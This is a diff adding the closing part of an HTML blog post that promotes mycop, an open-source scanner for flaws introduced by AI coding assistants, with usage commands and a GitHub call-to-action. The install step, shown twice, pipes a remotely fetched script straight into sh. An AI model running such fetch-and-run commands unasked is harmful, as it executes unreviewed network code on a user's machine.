+    <h2>Catch All 10 Automatically with mycop</h2>
+
+    <p><a href="https://github.com/AbdumajidRashidov/mycop">mycop</a> is an open-source security scanner built specifically for the vulnerabilities that AI coding assistants introduce. It ships with 100 built-in rules covering OWASP Top 10 and CWE Top 25, supports Python, JavaScript, and TypeScript, and requires zero configuration.</p>
+
+<pre># Install
+curl -fsSL https://raw.githubusercontent.com/AbdumajidRashidov/mycop/main/install.sh | sh
+
+# Scan your project
+mycop scan .
+
+# Auto-fix vulnerabilities with AI
+mycop fix . --dry-run
+
+# Scan only changed files (great for CI)
+mycop scan --diff .</pre>
+
+    <p>Every vulnerability in this post is detected by mycop's built-in rules. No custom configuration needed &mdash; install and scan.</p>
+
+    <div class="cta-box">
+      <h3>Stop shipping Copilot's vulnerabilities to production</h3>
+      <p>Run mycop on your codebase and see how many of these 10 vulnerabilities are already in your code.</p>
+      <code style="display:block;background:var(--terminal-bg);color:var(--green);padding:12px 16px;border-radius:8px;margin-bottom:16px;font-size:0.9rem">curl -fsSL https://raw.githubusercontent.com/AbdumajidRashidov/mycop/main/install.sh | sh && mycop scan .</code>
+      <a href="https://github.com/AbdumajidRashidov/mycop" target="_blank" class="btn">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+          <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+        </svg>
+        Star on GitHub
+      </a>
+    </div>
+
+    <hr>
+
+    <p><em>mycop is MIT licensed and open source. Scanning requires no API keys and runs entirely offline. Auto-fix requires an AI provider (Claude, OpenAI, or Ollama). It runs on macOS, Linux, and Windows.</em></p>
+
+  </article>
+
+  <footer>
+    <div class="footer-inner">
+      <span>MIT License &middot; Built with Rust</span>
+      <div class="footer-links">
+        <a href="https://github.com/AbdumajidRashidov/mycop" target="_blank">GitHub</a>
+        <a href="https://crates.io/crates/mycop" target="_blank">Crates.io</a>
+        <a href="https://github.com/AbdumajidRashidov/mycop/issues" target="_blank">Issues</a>
+      </div>
+    </div>
+  </footer>
+
+</body>
+
+</html>
